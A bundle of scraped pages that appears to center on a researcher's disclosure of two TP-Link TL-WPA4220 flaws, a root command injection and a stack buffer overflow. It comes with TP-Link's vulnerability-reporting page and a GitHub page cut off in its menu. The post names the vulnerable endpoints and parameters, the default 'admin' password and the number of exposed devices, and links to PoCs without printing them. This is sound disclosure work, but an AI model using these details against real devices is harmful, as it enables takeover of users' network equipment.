=== Content from the-hyperbolic.com_0c3c9845_20250119_122043.html ===


# the hyperbolic

* [home](/)
* [blog](/posts)
* [tags](/tags)
* [about](/about)

Previous post
Next post
Back to top
Share post

* [CVE-2020-24297](#cve-2020-24297)
* [CVE-2020-28005](#cve-2020-28005)
* [Exposed Devices](#exposed-devices)
* [Recommendations](#recommendations)
* [Disclosure Timeline](#disclosure-timeline)

# CVE-2020-24297 and CVE-2020-28005: Vulnerabilities in TP-Link's TL-WPA4220

2020-11-18

 *3 minutes*

[CVE-2020-24297](/tags/cve-2020-24297)
[CVE-2020-28005](/tags/cve-2020-28005)
[embedded](/tags/embedded)
[TP-Link](/tags/tp-link)

In this post, I’m going to describe some vulnerabilities that I found a while ago, affecting the HTTP server of TP-Link’s Powerline Adapter/WiFi Extender TL-WPA4220 (hardware versions 2, 3, and 4). These flaws are **two command injection vulnerabilities** that can grant an attacker root access to the device (CVE-2020-24297), as well as **a stack-based buffer overflow vulnerability** that can be used to crash the `http` service (CVE-2020-28005).

These flaws can be exploited by a remote authenticated attacker that is connected to the LAN, or that has access to the web management interface in the uncommon situation that it is exposed to the internet. As the default password for the web interface is easily guessable (yes, it’s `admin`), in most cases this means that anyone connected to the LAN can take advantage of them.

After disclosing these flaws to TP-Link, they have been patched in the latest firmware version `TL-WPA4220(EU)_V4_201023` (you can get it [here](https://static.tp-link.com/2021/202101/20210113/TL-WPA4220%28EU%29_V4_201023.zip)), which corresponds to hardware version 4. For hardware versions 2 and 3 no patch has been published to the moment, so all versions are still vulnerable.

For a thorough explanation of how I found these vulnerabilities, see the *Hacking the TL-WPA4220* series:

* [Hacking the TL-WPA4220, Part 1: Laying the Ground](/posts/hacking-the-tlwpa4220-part-1/)
* [Hacking the TL-WPA4220, Part 2: The Command Injections](/posts/hacking-the-tlwpa4220-part-2/)
* [Hacking the TL-WPA4220, Part 3: Talking to the Server](/posts/hacking-the-tlwpa4220-part-3/)
* [Hacking the TL-WPA4220, Part 4: The Buffer Overflow](/posts/hacking-the-tlwpa4220-part-4/)

## CVE-2020-24297

The command injection vulnerabilities exist in the endpoint **`/admin/powerline`**, when the `form` parameter is set to `plc_add` or `plc_device`, and malicious POST data is passed. The existing flaw is caused by the insufficient validation or sanitization of the POST parameters **`devicePwd`** and **`key`** respectively. See CVE page [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24297).

Since the HTTP server is running as `root`, these vulnerabilities can be used to take full control of the device.

A PoC for this vulnerability can be found [here](https://github.com/ocastejon/exploits/blob/main/cve-2020-24297/tplink-wpa4220-rce-exploit.py).

## CVE-2020-28005

The stack-based buffer overflow exists in the endpoint **`/admin/syslog`**, when the `form` parameter is set to `filter`, and malicious POST data is passed. The existing flaw is caused by the unexisting validation of the length of the POST parameter **`type`**. See CVE page [here](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28005).

Since partial Address Space Layout Randomization (ASLR) is enabled on the device, this vulnerability alone can’t be used to achieve remote code execution. However, it can be used to crash the HTTP service.

A PoC for this vulnerability can be found [here](https://github.com/ocastejon/exploits/blob/main/cve-2020-28005/tplink-wpa4220-dos-exploit.py).

## Exposed Devices

As mentioned above, to exploit these vulnerabilities an attacker has to be connected to the LAN to be able to access the web management interface. However, a quick Shodan search reveals that a total of **995 TL-WPA4220 devices have their web management interface exposed to the internet**, and are therefore potentially exploitable by remote attackers:

![Shodan Search](/img/vulnerabilities-in-tlwpa4220/shodan.png "Shodan search revealing exposed TL-WPA4220 devices")

Of course, to be exploitable, these devices need to have a vulnerable firmware version, and the default (or a guessable) password, so most probably not all of these devices can be exploited.

## Recommendations

* **Change the default password** of the web management interface to a non-guessable, secure one.
* If your TP-WPA4220 has hardware version 4, **upgrade the firmware** with the latest release (see [the vendor’s page](https://www.tp-link.com/en/support/download/tl-wpa4220/v4/#Firmware)).

## Disclosure Timeline

* **2020/07/20** - First command injection vulnerability reported to the vendor
* **2020/08/04** - Vulnerability confirmed by the vendor. Additional command injection and buffer overflow vulnerabilities reported to the vendor
* **2020/10/27** - Firmware upgrade shared by the vendor
* **2020/10/29** - Confirmation to the vendor that the reported vulnerabilities had been fixed in the upgraded firmware
* **2020/11/12** - Firmware upgrade published
* **2020/11/18** - Publication of CVE-2020-24297 and CVE-2020-28005 by MITRE

*EDIT*:

* **2020/12/18** - At some point before this date, TP-Link removed the firmware upgrade from their site (for reasons unknown to me). I asked them to put the upgrade back as soon as possible
* **2021/01/13** - Firmware upgrade is republished

* [home](/)
* [blog](/posts)
* [tags](/tags)
* [about](/about)

* [CVE-2020-24297](#cve-2020-24297)
* [CVE-2020-28005](#cve-2020-28005)
* [Exposed Devices](#exposed-devices)
* [Recommendations](#recommendations)
* [Disclosure Timeline](#disclosure-timeline)

Menu
TOC
share
Top

Copyright © 2022 Oriol CastejÃ³n

* [home](/)
* [blog](/posts)
* [tags](/tags)
* [about](/about)



=== Content from www.tp-link.com_9c964bb6_20250119_122044.html ===


Your browser does not support JavaScript. Please turn it on for the best experience.

Click to skip the navigation bar

[Support](/us/support/)

1. [All Support](/us/support/)
2. [Download Center](/us/support/download/)
3. [Support Videos](/us/support/setup-video/)
4. [FAQs](/us/support/faq/)
5. [TP-Link Community](https://community.tp-link.com)
6. [Contact Technical Support](/us/support/contact-technical-support/)

Where to Buy

1. [Online Stores](/us/where-to-buy/#Online Stores)
2. [Distribution Partners](/us/where-to-buy/#Distribution Partners)
3. [Retailers](/us/where-to-buy/#Retailers)
4. [Reseller Partners](/us/where-to-buy/#Reseller Partners)
5. [Solution Partners](/us/where-to-buy/#Solution Partners)

[United States / English](/us/choose-your-location/)

[TP-Link, Reliably Smart](/us/)

[Search](/us/search/)

* Networking
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [WiFi 7](/us/wifi7/)
  + [Meet WiFi 6E](/us/wifi-6e/)
  + [OneMesh](/us/onemesh/)
  + [AI-Driven Mesh](/us/mesh/ai-driven-mesh/)
  + [VPN](/us/technology/vpn/)

  [Mesh WiFi](/us/whole-home-mesh/)

  Wi-Fi for the whole home

  + [Deco Whole Home WiFi](/us/whole-home-mesh/)
  + [Deco Systems](/us/deco-mesh-wifi/product-family/)

  [Routers](/us/explore/wifi-router/)

  Create a fast and reliable Wi-Fi

  + [WiFi Routers](/us/home-networking/wifi-router/)
  + [WiFi 7 Routers](/us/home-networking/wifi-router/?filterby=6271)
  + [WiFi 6 Routers](/us/home-networking/wifi-router/?filterby=5730)
  + [VPN Routers](/us/home-networking/wifi-router/?filterby=AND%7C6111%7C6112)
  + [Gaming Routers](/us/home-networking/wifi-router/?filterby=5748)

  [Network Expansion](/us/home-networking/all-network-expansion/)

  Easy ways to expand and enhance your network

  + [Range Extenders](/us/home-networking/range-extender/)
  + [Powerline](/us/home-networking/powerline/)
  + [Access Points](/us/home-networking/access-point/)

  [Festa](/us/landing/festa/)

  The Networking Solution Built for Small Businesses and Prosumers

  + [What is Festa?](/us/landing/festa/)
  + [WiFi](/us/business-networking/soho-festa-access-point/)
  + [Switches](/us/business-networking/soho-festa-switch/)
  + [Gateways](/us/business-networking/soho-festa-gateway/)
  + [All Products](/us/business-networking/all-soho-festa/)

  [Accessories](/us/home-networking/all-accessories/)

  Everything else you need for a connected lifestyle

  + [USB Hubs](/us/home-networking/usb-hub/)
  + [USB Converters](/us/home-networking/usb-converter/)
  + [Charging](/us/home-networking/charging/)
  + [Bluetooth Receivers](/us/home-networking/bluetooth-reciever/)

  [Home Office Networking](/us/business-networking/all-soho-switch/)

  The easy-to-use solution for Home Office networking

  + [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
  + [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)

  [Adapters](/us/home-networking/all-adapter/)

  Equip your devices for a faster Wi-Fi

  + [PCIe Adapters](/us/home-networking/pci-adapter/)
  + [USB Adapters](/us/home-networking/usb-adapter/)
* Smart Home
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [Kasa Smart](https://www.kasasmart.com/us)
  + [Tapo Smart](https://www.tapo.com/us/)
  + [Best Solar-Powered Security Cameras 2024](https://www.tapo.com/us/news/429/)
  + [Apple HomeKit](/us/promotion/apple-homekit/)

  [Smart Cameras](/us/home-networking/cloud-camera/)

  Keeping an eye on what matters

  [Smart Plugs](/us/home-networking/smart-plug/)

  Smarten up your home devices

  [Smart Switches](/us/home-networking/smart-switch/)

  More than just on and off

  [Smart Lighting](/us/home-networking/smart-bulb/)

  Light for every occasion

  [Smart Robot Vacuums](/us/smart-home/all-robot-vacuum/)

  Everyday cleaning made easy

  + [Robot Vacuums](/us/smart-home/robot-vacuum/)
  + [Robot Vacuum Accessories](/us/smart-home/robot-vacuum-accessory/)

  [Smart Sensors](/us/smart-home/smart-sensor/)

  Worry-free home automation

  [Smart Hub](/us/home-networking/smart-hub/)

  Seamlessly connect everything

  [New Release](/us/smart-home/new-release/)
* [Business
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://www.omadanetworks.com)

  [Omada](https://www.tp-link.com/us/business-networking/)

  The cloud networking solutions for small and medium business

  + [What is Omada?](/us/omada-sdn/)
  + [Wireless](/us/business-networking/omada/wifi/)
  + [Switches](/us/business-networking/omada/switch/)
  + [Gateways](/us/business-networking/omada/router/)
  + [Controllers](/us/business-networking/omada/controller/)
  + [Accessories](/us/business-networking/omada/accessory/)
  + [All Products](/us/business-networking/all-omada/)

  [Omada Pro](/us/business-networking/all-omada-pro/)

  The intelligent cloud solution for enterprise networking

  + [What is Omada Pro?](/us/landing/omada-pro/)
  + [Wireless](/us/business-networking/all-omada-pro-wifi/)
  + [Switches](/us/business-networking/all-omada-pro-switch/)
  + [Gateways](/us/business-networking/all-omada-pro-router/)
  + [Controllers](/us/business-networking/all-omada-pro-controller/)
  + [All Products](/us/business-networking/all-omada-pro/)

  [Festa](/us/landing/festa/)

  The Networking Solution Built for Small Businesses and Prosumers

  + [What is Festa?](/us/landing/festa/)
  + [WiFi](/us/business-networking/soho-festa-access-point/)
  + [Switches](/us/business-networking/soho-festa-switch/)
  + [Gateways](/us/business-networking/soho-festa-gateway/)
  + [All Products](/us/business-networking/all-soho-festa/)

  [VIGI](https://www.vigi.com/us/)

  The smart surveillance solution for small and medium business

  + [What is VIGI?](https://www.vigi.com/us/vigi/about-vigi/)
  + [Cameras](https://www.vigi.com/us/business-networking/vigi-network-camera/)
  + [Video Recorders](https://www.vigi.com/us/business-networking/vigi-network-video-recorder/)
  + [Software Service](https://www.vigi.com/us/business-networking/vigi-software-service/)
  + [All Products](https://www.vigi.com/us/business-networking/all-vigi-surveillance/)

  [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)

  Plug and play for instant connection without management

  + [PoE Switches](/us/business-networking/soho-switch-poe/)
  + [All Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)

  More Products

  Explore more products you need

  + [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
  + [Accessories](/us/business-networking/soho-accessory/)
  + [Pharos Wireless Bridges](/us/business-networking/all-pharos-wireless-bridge/)
* PROVIDERS
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)
  + [TP-Link Aginet Unified Cloud (TAUC)](https://www.tp-link.com/us/tauc/)
  + [Optical Network](/us/landing/pon/)

  [Whole-Home Mesh](/us/service-provider/home-wifi-system/)

  A seamless, intelligent and easy-to-configure mesh network

  [XGS-PON/GPON](/us/service-provider/gpon/)

  The leading technology for delivering gigabit Internet services
* [Community
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](https://community.tp-link.com)

  [For Home](https://community.tp-link.com/us/home)

  [For Smart Home](https://community.tp-link.com/us/smart-home)

  [For Business](https://community.tp-link.com/en/business)

  [Brand Ambassador](https://www.tp-link.com/us/brandambassador/)
* [OUR SECURITY
  ![Click to open the navigation bar](https://static.tp-link.com/assets/images/icon/arrow-gray-down.svg)](/us/landing/security-commitment/)

[TP-Link, Reliably Smart](/us/)

[Search](/us/search/)
Menu

Submit

* Networking

  Back

  + Mesh WiFi

    - [Deco Whole Home WiFi](/us/whole-home-mesh/)
    - [Deco Systems](/us/deco-mesh-wifi/product-family/)
  + Routers

    - [Recommended Routers](/us/explore/wifi-router/)
    - [WiFi Routers](/us/home-networking/wifi-router/)
    - [WiFi 7 Routers](/us/home-networking/wifi-router/?filterby=6271)
    - [WiFi 6 Routers](/us/home-networking/wifi-router/?filterby=5730)
    - [VPN Routers](/us/home-networking/wifi-router/?filterby=AND%7C6111%7C6112)
    - [Gaming Routers](/us/home-networking/wifi-router/?filterby=5748)
  + Network Expansion

    - [Range Extenders](/us/home-networking/range-extender/)
    - [Powerline](/us/home-networking/powerline/)
    - [Access Points](/us/home-networking/access-point/)
  + Festa

    - [What is Festa?](/us/landing/festa/)
    - [WiFi](/us/business-networking/soho-festa-access-point/)
    - [Switches](/us/business-networking/soho-festa-switch/)
    - [Gateways](/us/business-networking/soho-festa-gateway/)
    - [All Products](/us/business-networking/all-soho-festa/)
  + Accessories

    - [USB Hubs](/us/home-networking/usb-hub/)
    - [USB Converters](/us/home-networking/usb-converter/)
    - [Charging](/us/home-networking/charging/)
    - [Bluetooth Receivers](/us/home-networking/bluetooth-reciever/)
  + Home Office Networking

    - [Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
    - [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
  + Adapters

    - [PCIe Adapters](/us/home-networking/pci-adapter/)
    - [USB Adapters](/us/home-networking/usb-adapter/)
  + [WiFi 7](/us/wifi7/)
  + [Meet WiFi 6E](/us/wifi-6e/)
  + [OneMesh](/us/onemesh/)
  + [AI-Driven Mesh](/us/mesh/ai-driven-mesh/)
  + [VPN](/us/technology/vpn/)
* Smart Home

  Back

  + [Smart Cameras](/us/home-networking/cloud-camera/)
  + [Smart Plugs](/us/home-networking/smart-plug/)
  + [Smart Switches](/us/home-networking/smart-switch/)
  + [Smart Lighting](/us/home-networking/smart-bulb/)
  + Smart Robot Vacuums

    - [Robot Vacuums](/us/smart-home/robot-vacuum/)
    - [Robot Vacuum Accessories](/us/smart-home/robot-vacuum-accessory/)
  + [Smart Sensors](/us/smart-home/smart-sensor/)
  + [Smart Hub](/us/home-networking/smart-hub/)
  + [New Release](/us/smart-home/new-release/)
  + [Kasa Smart](https://www.kasasmart.com/us)
  + [Tapo Smart](https://www.tapo.com/us/)
  + [Best Solar-Powered Security Cameras 2024](https://www.tapo.com/us/news/429/)
  + [Apple HomeKit](/us/promotion/apple-homekit/)
* Business

  Back

  + Omada

    - [What is Omada?](/us/omada-sdn/)
    - [Wireless](/us/business-networking/omada/wifi/)
    - [Switches](/us/business-networking/omada/switch/)
    - [Gateways](/us/business-networking/omada/router/)
    - [Controllers](/us/business-networking/omada/controller/)
    - [Accessories](/us/business-networking/omada/accessory/)
    - [All Products](/us/business-networking/all-omada/)
  + Omada Pro

    - [What is Omada Pro?](/us/landing/omada-pro/)
    - [Wireless](/us/business-networking/all-omada-pro-wifi/)
    - [Switches](/us/business-networking/all-omada-pro-switch/)
    - [Gateways](/us/business-networking/all-omada-pro-router/)
    - [Controllers](/us/business-networking/all-omada-pro-controller/)
    - [All Products](/us/business-networking/all-omada-pro/)
  + Festa

    - [What is Festa?](/us/landing/festa/)
    - [WiFi](/us/business-networking/soho-festa-access-point/)
    - [Switches](/us/business-networking/soho-festa-switch/)
    - [Gateways](/us/business-networking/soho-festa-gateway/)
    - [All Products](/us/business-networking/all-soho-festa/)
  + VIGI

    - [What is VIGI?](https://www.vigi.com/us/vigi/about-vigi/)
    - [Cameras](https://www.vigi.com/us/business-networking/vigi-network-camera/)
    - [Video Recorders](https://www.vigi.com/us/business-networking/vigi-network-video-recorder/)
    - [Software Service](https://www.vigi.com/us/business-networking/vigi-software-service/)
    - [All Products](https://www.vigi.com/us/business-networking/all-vigi-surveillance/)
  + Unmanaged Switches

    - [PoE Switches](/us/business-networking/soho-switch-poe/)
    - [All Unmanaged Switches](/us/business-networking/soho-switch-unmanaged/)
  + More Products

    - [Easy Smart Switches](/us/business-networking/soho-switch-easy-smart/)
    - [Accessories](/us/business-networking/soho-accessory/)
    - [Pharos Wireless Bridges](/us/business-networking/all-pharos-wireless-bridge/)
* PROVIDERS

  Back

  + [Whole-Home Mesh](/us/service-provider/home-wifi-system/)
  + [XGS-PON/GPON](/us/service-provider/gpon/)
  + [TP-Link Aginet Unified Cloud (TAUC)](https://www.tp-link.com/us/tauc/)
  + [Optical Network](/us/landing/pon/)
* Support

  Back

  + [All Support](/us/support/)
  + [Download Center](/us/support/download/)
  + [Support Videos](/us/support/setup-video/)
  + [FAQs](/us/support/faq/)
  + [TP-Link Community](https://community.tp-link.com)
  + [Contact Technical Support](/us/support/contact-technical-support/)
  + [Replacement & Warranty](https://www.tp-link.com/us/support/replacement-warranty/)
  + [TP-Link Emulators](/us/support/emulator/)
  + [Compatibility List](/us/support/compatibility-list/)
  + [GPL Code Center](/us/support/gpl-code/)
* Where to Buy

  Back

  + [Online Stores](/us/where-to-buy/#Online Stores)
  + [Distribution Partners](/us/where-to-buy/#Distribution Partners)
  + [Retailers](/us/where-to-buy/#Retailers)
  + [Reseller Partners](/us/where-to-buy/#Reseller Partners)
  + [Solution Partners](/us/where-to-buy/#Solution Partners)
* Community

  Back

  + [For Home](https://community.tp-link.com/us/home)
  + [For Smart Home](https://community.tp-link.com/us/smart-home)
  + [For Business](https://community.tp-link.com/en/business)
  + [Brand Ambassador](https://www.tp-link.com/us/brandambassador/)
* [OUR SECURITY](/us/landing/security-commitment/)

+ [kasa](https://www.kasasmart.com/us)
+ [tapo](https://www.tapo.com/us/)
+ [omada](https://www.omadanetworks.com)
+ [VIGI](https://www.vigi.com/us/)

# TP-Link Product Security Advisory

Protecting our customers from threats to their security is always an important task for TP-Link. As a key player in global Networking and Smart Home markets, we will do our utmost to provide our users with secure stable products and services, and to strictly protect the privacy and security of their data.

We welcome and encourage all reports related to product security or user privacy. We will follow established processes to address them and provide timely feedback.

## Report Vulnerabilities to TP-Link

We strongly encourage organizations and individuals to contact TP-Link’s security team to report any potential security issue.

| Contact way | |
| --- | --- |
| Email address | security@tp-link.com |
| Template | [Potential vulnerability report template](https://static.tp-link.com/document/excel/potential%20vulnerability%20report%20template%20v1.0.xlsx) |
| Hours | TP-Link will endeavor to respond to the report within five working days. |
| PGP Public Key | [Click to download](https://static.tp-link.com/upload/beta/2023/202312/20231214/PublicPGPKey.zip) |

TP-Link will need to obtain detailed information about the reported vulnerability to more accurately and quickly begin the verification process. We strongly recommend submitting a vulnerability report according to the template we provide above.

TP-Link supports encrypted messages using Pretty Good Privacy (PGP)/GNU Privacy Guard (GPG) encryption software.

## Responsible Reporting Guidelines

1. All parties to a vulnerability disclosure should comply with the laws of their country or region.

2. Vulnerability reports should be based on the latest released firmware, and preferably written in English.

3. Report vulnerabilities through the dedicated communication channel. TP-Link may receive reports from other channels but does not guarantee that the report will be acknowledged.

4. Adhere to data protection principles at all times and do not violate the privacy and data security of TP-Link's users, employees, agents, services or systems during the vulnerability discovery process.

5. Maintain communication and cooperation during the disclosure process and avoid disclosing information about the vulnerability prior to the negotiated disclosure date.

6. TP-Link is not currently operating a vulnerability bounty program.

## How TP-Link Deals with Vulnerabilities

* Awareness & Receipt
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Verification
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Remediation
* ![](https://static.tp-link.com/handling-vulnerability-process-arrow.png)
* Notification

TP-Link encourages customers, vendors, independent researchers, security organizations, etc. to proactively report any potential vulnerabilities to the security team. At the same time, TP-Link will proactively obtain information about vulnerabilities in TP-Link products from the community, vulnerability repositories and various security websites. In order to be aware of vulnerabilities as soon as they are discovered.

TP-Link will respond to vulnerability reports as soon as possible, usually within five business days.

TP-Link Security will work with the product team to perform a preliminary analysis and validation of the report to determine the validity, severity and impact of the vulnerability. We may contact you if we need more information about the reported vulnerability.

Once the vulnerability has been identified, we will develop and implement a remediation plan to provide a solution for all affected customers.

Remediation typically takes up to 90 days and in some cases may take longer.

You can keep up to date with our progress and the completion of any remediation activities.

TP-Link will issue a security advisory when one or more of the following conditions are met:

1. The severity of the vulnerability is rated CRITICAL by the TP-Link security team and TP-Link has completed the vulnerability response process and sufficient mitigation solutions are available to assist customers in eliminating all security risks.

2. If the vulnerability has been actively exploited and is likely to increase the security risk to TP-Link customers, or if the vulnerability is likely to increase public concern about the security of TP-Link products, TP-Link will expedite the release of a security bulletin about the vulnerability, which may or may not include a full firmware patch or emergency fix.

Click to submit a security-related inquiry regarding one of our products to TP-Link Technical Support.

[Contact Technical Support](/us/support/contact-technical-support/#E-mail-Support)

### Bulletin

[[4308] Software and Firmware Support on End of Service Products](/us/support/faq/4308/)

[[4061] Statement on Vulnerabilities Noted in Omada System Report](/us/support/faq/4061/)

[[4008] Statement on Remote Command Execution on Archer C5400X(CVE-2024-5035)](/us/support/faq/4008/)

[[3722] Statement on Insecure Local Communication Vulnerabilities in Tapo and Kasa Devices and apps](/us/support/faq/3722/)

[[3643] Official Statement on Archer AX21 Remote Code Execution Vulnerability (CVE-2023-1389)](/us/support/faq/3643/)

[[3348] Statement on Spring Framework RCE Vulnerability( For DPMS)](/us/support/faq/3348/)

[[3347] Statement on Spring Framework RCE Vulnerability(For Omada Software Controller)](/us/support/faq/3347/)

[[3279] Security Advisory for KCodes NetUSB Vulnerabilities](/us/support/faq/3279/)

[[3255] Statement on Apache Log4j2 Vulnerability](/us/support/faq/3255/)

[[2803] Buffer Overflow in pppd Vulnerability](/us/support/faq/2803/)

[[2278] GhostDNS Malware Security](/us/support/faq/2278/)

[[2276] Remote Exploitation Vulnerability](/us/support/faq/2276/)

[[2212] VPNFilter Malware Security](/us/support/faq/2212/)

[[2166] Fix for vulnerabilities of TL-WR740N & TL-WR940N](/us/support/faq/2166/)

[[1970] WPA2 Security (KRACKs) Vulnerability Statement](/us/support/faq/1970/)

[[1963] Notice of Fraudulent and non-TP-Link Affiliated Websites](/us/support/faq/1963/)

[[1859] Fixing the “Directory Traversal” security vulnerability for TL-WA701ND](/us/support/faq/1859/)

[[1595] Addressing vulnerabilities of the M5350](/us/support/faq/1595/)

## Subscribe>TP-Link takes your privacy seriously. For further details on TP-Link's privacy practices, see [TP-Link's Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US).

Be The First To Get Exclusive Deals & News

Email Address

Email Error

Subscribe

Consumer Networking and Smart Home

Service Providers Products (Aginet)

Business Networking and Surveillance (Omada and VIGI)

By completing this form you confirm that you understand and agree to our [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US).

reCaptcha not verified

Subscribe

## Let's Connect

* [www.facebook.com](https://www.facebook.com/TPLINKUS/)
* [Instagram](https://www.instagram.com/tplinkus/)
* [www.youtube.com](https://www.youtube.com/user/TPLINKTECH)
* [www.linkedin.com](https://www.linkedin.com/company/tp-link/)
* [twitter.com](https://twitter.com/tplinkus)

[About](/us/about/about-us/)

* [About Us](/us/about/about-us/)
* [Corporate Information](/us/about-us/corporate-information/)
* [Contact Us](/us/about-us/contact/)
* [Careers at TP-Link](/us/about-us/career/)
* [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US)
* [Do Not Sell My Info](/us/about-us/privacy/do-not-sell-my-info/)
* [Accessibility](/us/accessibility/)

[Press](/us/press/news/)

* [News](/us/press/news/)
* [Blog](/us/blog/)
* [Security Advisory](/us/press/security-advisory/)
* [Awards](/us/press/award/)

Partners

* [Partner Program](https://partner.tp-link.com/us/)
* [Partner Deal Registration](https://partner.tp-link.com/us/deal/deal.html)
* [MAP Policy](https://www.tp-link.com/us/map-policy/?type=smb)

Learning Center

* [Technology Trends](/us/learning-center/)
* [Training & Certification](https://training.tp-link.com/)

[Promotions](/us/promotion/)

* [![tp-link](https://static.tp-link.com/upload/menu/tp-link_20231205034128d.png)](https://www.tp-link.com/us/)
* [![kasa](https://static.tp-link.com/upload/menu/kasa_20231205034427x.png)](https://www.kasasmart.com/us)
* [![tapo](https://static.tp-link.com/upload/menu/tapo_20231205034542j.png)](https://www.tapo.com/us/)
* [![omada](https://static.tp-link.com/upload/menu/omada_20231205034833a.png)](https://www.omadanetworks.com)

©2025 TP-Link Systems Inc. and its affiliated companies. All rights reserved.

TP-Link, Tapo, Kasa, Omada, VIGI, Aginet, HomeShield, and Tapo Care branded products are products of TP-Link Systems Inc. or its affiliates.
 Note: Some services and materials may require you to accept additional terms and conditions before access or use.
 References to "TP-Link" may include TP-Link Systems Inc., its subsidiaries, or business units within the TP-Link corporate structure, as applicable.
 The materials provided, including but not limited to press releases, presentations, blog posts, and webcasts, are current as of the date of publication and may be superseded by subsequent updates.

[United States / English](/us/choose-your-location/)

From Ireland?

Get products, events and services for your region.

[GO](https://www.tp-link.com/uk/press/security-advisory/)
[Other Option](https://www.tp-link.com/us/choose-your-location/)

Close

We have updated our Policies. Read [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) and [Terms of Use](https://privacy.tp-link.com/web/official/terms-of-use?region=US) here.
 This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) .

Cookie Settings
Accept All Cookies

We have updated our Policies. Read [Privacy Policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) and [Terms of Use](https://privacy.tp-link.com/web/official/terms-of-use?region=US) here.
 This website uses cookies to improve website navigation, analyze online activities and have the best possible user experience on our website. You can object to the use of cookies at any time. You can find more information in our  [privacy policy](https://privacy.tp-link.com/web/official/privacy-policy?region=US) .

Basic Cookies

These cookies are necessary for the website to function and cannot be deactivated in your systems.

TP-Link

accepted\_local\_switcher, tp\_privacy\_base, tp\_privacy\_marketing, tp\_smb-select-product\_scence, tp\_smb-select-product\_scenceSimple, tp\_smb-select-product\_userChoice, tp\_smb-select-product\_userChoiceSimple, tp\_smb-select-product\_userInfo, tp\_smb-select-product\_userInfoSimple, tp\_top-banner, tp\_popup-bottom, tp\_popup-center, tp\_popup-right-middle, tp\_popup-right-bottom, tp\_productCategoryType

Livechat

\_\_livechat, \_\_lc2\_cid, \_\_lc2\_cst, \_\_lc\_cid, \_\_lc\_cst, CASID

Youtube

id, VISITOR\_INFO1\_LIVE, LOGIN\_INFO, SIDCC, SAPISID, APISID, SSID, SID, YSC, \_\_Secure-1PSID, \_\_Secure-1PAPISID, \_\_Secure-1PSIDCC, \_\_Secure-3PSID, \_\_Secure-3PAPISID, \_\_Secure-3PSIDCC, 1P\_JAR, AEC, NID, OTZ

Analysis and Marketing Cookies

Analysis cookies enable us to analyze your activities on our website in order to improve and adapt the functionality of our website.

The marketing cookies can be set through our website by our advertising partners in order to create a profile of your interests and to show you relevant advertisements on other websites.

Google Analytics & Google Tag Manager

\_gid, \_ga\_<container-id>, \_ga, \_gat\_gtag\_<container-id>

Google Ads & DoubleClick

test\_cookie, \_gcl\_au

Meta Pixel

\_fbp

Crazy Egg

cebsp\_, \_ce.s, \_ce.clock\_data, \_ce.clock\_event, cebs

Linkedin

lidc, AnalyticsSyncHistory, UserMatchHistory, bcookie, li\_sugr, ln\_or

Accept All Cookies
Save Settings



=== Content from github.com_11101661_20250119_135940.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Focastejon%2Fexploits%2Fblob%2Fmain%2Fcve-2020-24297%2Ftplink-wpa4220-rce-exploit.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
